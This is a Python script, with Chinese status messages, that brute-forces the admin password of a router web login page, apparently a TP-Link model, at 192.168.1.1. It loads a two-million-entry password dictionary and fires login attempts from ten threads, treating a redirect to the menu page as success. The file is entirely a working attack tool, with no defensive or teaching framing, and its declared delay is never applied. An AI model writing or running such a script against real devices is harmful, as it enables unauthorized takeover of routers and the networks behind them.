import requests
import time
import concurrent.futures

TARGET_URL = "http://192.168.1.1/userRpm/LoginRpm.htm?Save=Save"
USERNAME_FIELD = "userName"
PASSWORD_FIELD = "psd"
USERNAME = "admin"
DICT_PATH = "字典/top2000000.txt"
DELAY = 1

def try_login(pwd):
    data = {USERNAME_FIELD: USERNAME, PASSWORD_FIELD: pwd}
    try:

        resp = requests.post(TARGET_URL, data=data, timeout=5, allow_redirects=False)

        if resp.status_code == 302:
            location = resp.headers.get('Location', '')
            if 'MenuRpm' in location:
                return True, "302 -> MenuRpm"

        if resp.status_code == 200 and 'error_code' in resp.text:
            return False, "error_code"

        return False, f"未知状态: {resp.status_code}"

    except Exception as e:
        return False, str(e)

def main():
    print(f"[*] 加载字典...")
    with open(DICT_PATH, 'r', encoding='utf-8') as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] 共 {len(passwords)} 个密码，启动 10 个线程同时爆破...")

    found_password = None

    def worker(pwd):
        nonlocal found_password
        if found_password:
            return None
        ok, _ = try_login(pwd)
        if ok:
            return pwd
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_pwd = {executor.submit(worker, pwd): pwd for pwd in passwords}
        for future in concurrent.futures.as_completed(future_to_pwd):
            result = future.result()
            if result:
                found_password = result
                print(f"\n[🔥] 密码找到: {found_password}")
                executor.shutdown(wait=False, cancel_futures=True)
                break
    if not found_password:
        print("[!] 遍历完成，未找到密码。")

if __name__ == "__main__":
    main()
